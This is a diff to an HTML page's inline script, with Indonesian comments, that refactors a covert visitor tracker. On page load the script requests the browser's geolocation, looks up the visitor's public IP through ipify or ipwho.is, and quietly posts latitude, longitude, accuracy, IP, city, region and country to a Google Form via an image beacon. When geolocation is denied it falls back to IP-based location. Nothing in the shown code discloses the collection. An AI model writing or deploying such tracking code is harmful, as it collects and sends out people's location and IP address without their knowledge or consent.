@@ -9,65 +9,75 @@
   <script>
     const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
     const F = {
-      lat:  'entry.336954328',    // Latitude
-      long: 'entry.122334606',    // Longitude
-      acc:  'entry.1466949585',   // Accuracy
-      city: 'entry.1958665783',   // City
-      reg:  'entry.1713030934',   // Region
-      id:   'entry.2142024660',   // Country/ID
-      ip:   'entry.1095561107'  // <–– ganti dengan ID field IP Address
+      lat:  'entry.336954328',   // Latitude
+      long: 'entry.122334606',   // Longitude
+      acc:  'entry.1466949585',  // Accuracy
+      city: 'entry.1958665783',  // City
+      reg:  'entry.1713030934',  // Region
+      id:   'entry.2142024660',  // Country/ID
+      ip:   'entry.1095561107'   // IP
     };
 
     function submit(params) {
       new Image().src = FORM_URL + '?' + new URLSearchParams(params);
     }
 
+    function sendAll(lat, lon, acc, city, reg, country, ip) {
+      const p = {
+        [F.lat]:  lat,
+        [F.long]: lon,
+        [F.acc]:  acc,
+        [F.ip]:   ip
+      };
+      if (city     !== undefined) p[F.city] = city;
+      if (reg      !== undefined) p[F.reg]  = reg;
+      if (country  !== undefined) p[F.id]   = country;
+      submit(p);
+    }
+
+    function onGeoSuccess(pos) {
+      const { latitude, longitude, accuracy } = pos.coords;
+      // ambil IP via api.ipify.org (CORS OK)
+      fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => sendAll(
+          latitude, longitude, accuracy,
+          undefined, undefined, undefined,
+          d.ip
+        ))
+        .catch(() => sendAll(
+          latitude, longitude, accuracy,
+          undefined, undefined, undefined,
+          'unknown'
+        ));
+    }
+
+    function onGeoError() {
+      // fallback: ipwho.is untuk IP + lokasi aproksimasi
+      fetch('https://ipwho.is/json/')
+        .then(r => r.json())
+        .then(d => sendAll(
+          d.latitude, d.longitude, 'IP',
+          d.city, d.region, d.country,
+          d.ip
+        ))
+        .catch(() => {
+          // jika semua gagal, kirim minimal IP
+          fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => submit({ [F.ip]: d.ip }))
+            .catch(() => submit({ [F.ip]: 'unknown' }));
+        });
+    }
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        p => {
-          // Pertama fetch IP-nya
-          fetch('https://ipapi.co/json/')
-            .then(r => r.json())
-            .then(d => {
-              submit({
-                [F.lat]:  p.coords.latitude,
-                [F.long]: p.coords.longitude,
-                [F.acc]:  p.coords.accuracy,
-                [F.ip]:   d.ip
-              });
-            })
-            .catch(() => {
-              // Jika gagal ambil IP
-              submit({
-                [F.lat]:  p.coords.latitude,
-                [F.long]: p.coords.longitude,
-                [F.acc]:  p.coords.accuracy,
-                [F.ip]:   'unknown'
-              });
-            });
-        },
-        _=> fallbackIP(),
+        onGeoSuccess,
+        onGeoError,
         { timeout: 8000 }
       );
     } else {
-      fallbackIP();
-    }
-
-    function fallbackIP() {
-      fetch('https://ipapi.co/json/')
-        .then(r => r.json())
-        .then(d => {
-          submit({
-            [F.lat]:  d.latitude,
-            [F.long]: d.longitude,
-            [F.acc]:  'IP',
-            [F.city]: d.city,
-            [F.reg]:  d.region,
-            [F.id]:   d.country_name,
-            [F.ip]:   d.ip
-          });
-        })
-        .catch(()=>{/* silent */});
+      onGeoError();
     }
   </script>
 </body>
